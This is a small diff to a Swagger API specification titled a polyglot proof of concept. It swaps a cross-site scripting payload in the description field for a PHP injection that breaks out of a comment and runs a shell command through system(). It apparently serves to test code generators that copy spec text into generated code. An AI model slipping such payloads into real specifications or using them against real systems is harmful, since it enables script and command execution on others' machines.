@@ -6,7 +6,7 @@ securityDefinitions:
 info:
   version: "0.0.1"
   title: Swagger Polyglot PoC
-  description: <script>alert(1)</script>
+  description: */ echo system(chr(0x6c).chr(0x73)); /*
 paths:
   /:
     get:
